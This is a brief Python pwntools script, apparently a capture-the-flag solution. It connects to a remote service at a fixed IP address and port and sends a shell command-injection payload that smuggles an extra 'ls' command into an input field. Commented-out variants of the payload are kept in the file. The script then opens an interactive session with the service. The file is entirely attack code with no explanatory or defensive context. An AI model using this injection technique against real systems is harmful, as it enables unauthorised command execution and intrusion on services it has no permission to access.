from pwn import *

#process = process("./testing")
process = remote("54.225.38.91", 1025);

#payload = "';ls;echo'a"
#payload = "3b9aafa12aceeccd29a154766194a964&&"
payload = "';ls>1;'"

process.sendline(payload)
print process.recvall()
process.interactive()
#process.interactive()